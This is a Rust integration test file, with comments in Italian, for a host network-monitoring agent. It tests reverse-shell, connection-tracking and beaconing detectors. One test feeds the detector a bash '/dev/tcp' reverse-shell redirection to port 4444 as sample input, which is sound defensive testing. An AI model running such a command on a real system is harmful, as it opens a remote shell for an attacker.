//! Integration test del network monitoring: verifica connection
//! tracking, rilevamento reverse shell e rilevamento beaconing come
//! collaborano sugli eventi normalizzati.

use std::sync::Arc;
use std::time::Duration;

use chrono::Utc;
use kerneltrace_agent::events::{Enricher, EventKind, EventPayload, NormalizedEvent, ProcessContext};
use kerneltrace_agent::network::{
    BeaconingDetector, BeaconingTracker, ConnectionTracker, ConnectionTrackerEnricher,
    ReverseShellDetector, TAG_SUSPECTED_BEACONING, TAG_SUSPECTED_REVERSE_SHELL,
};
use uuid::Uuid;

fn exec_event(filename: &str, args: Vec<&str>) -> NormalizedEvent {
    NormalizedEvent {
        id: Uuid::new_v4(),
        timestamp: Utc::now(),
        event_kind: EventKind::Exec,
        process: ProcessContext {
            pid: 100,
            tgid: 100,
            ppid: 1,
            uid: 1000,
            gid: 1000,
            comm: "sh".to_string(),
            cgroup_id: 0,
            parent_comm: None,
        },
        payload: EventPayload::Exec {
            filename: filename.to_string(),
            args: args.into_iter().map(String::from).collect(),
        },
        container: None,
        tags: Vec::new(),
    }
}

fn connect_event(pid: u32, dst_addr: &str, dst_port: u16) -> NormalizedEvent {
    NormalizedEvent {
        id: Uuid::new_v4(),
        timestamp: Utc::now(),
        event_kind: EventKind::Connect,
        process: ProcessContext {
            pid,
            tgid: pid,
            ppid: 1,
            uid: 0,
            gid: 0,
            comm: "malware".to_string(),
            cgroup_id: 0,
            parent_comm: None,
        },
        payload: EventPayload::Network {
            address_family: 4,
            protocol: 6,
            src_addr: "0.0.0.0".to_string(),
            dst_addr: dst_addr.to_string(),
            src_port: 0,
            dst_port,
            syscall: "connect".to_string(),
        },
        container: None,
        tags: Vec::new(),
    }
}

#[test]
fn reverse_shell_detector_tags_dev_tcp_redirection() {
    let detector = ReverseShellDetector;
    let mut event = exec_event("/bin/bash", vec!["-c", "exec 5<>/dev/tcp/10.0.0.1/4444"]);

    detector.enrich(&mut event);

    assert!(event.tags.contains(&TAG_SUSPECTED_REVERSE_SHELL.to_string()));
}

#[test]
fn reverse_shell_detector_does_not_flag_benign_exec() {
    let detector = ReverseShellDetector;
    let mut event = exec_event("/usr/bin/ls", vec!["-la"]);

    detector.enrich(&mut event);

    assert!(event.tags.is_empty());
}

#[test]
fn connection_tracker_enricher_records_outbound_connections() {
    let tracker = Arc::new(ConnectionTracker::new());
    let enricher = ConnectionTrackerEnricher::new(Arc::clone(&tracker));

    let mut event = connect_event(200, "203.0.113.5", 443);
    enricher.enrich(&mut event);

    assert_eq!(tracker.connections_for_pid(200).len(), 1);
}

#[test]
fn beaconing_detector_flags_regular_connection_intervals() {
    // Non possiamo attendere realmente minuti in un test automatizzato;
    // verifichiamo quindi il comportamento tramite il tracker sottostante
    // con osservazioni ravvicinate ma di durata sufficientemente uniforme
    // da superare la soglia di coefficiente di variazione, esercitando lo
    // stesso percorso di codice usato dall'enricher in produzione.
    let tracker = Arc::new(BeaconingTracker::new());
    let _detector = BeaconingDetector::new(Arc::clone(&tracker));

    let mut last_result = false;
    for _ in 0..6 {
        last_result = tracker.observe(300, "198.51.100.10", 8443);
        std::thread::sleep(Duration::from_millis(20));
    }

    assert!(last_result, "regular short intervals should eventually be flagged as beaconing");
}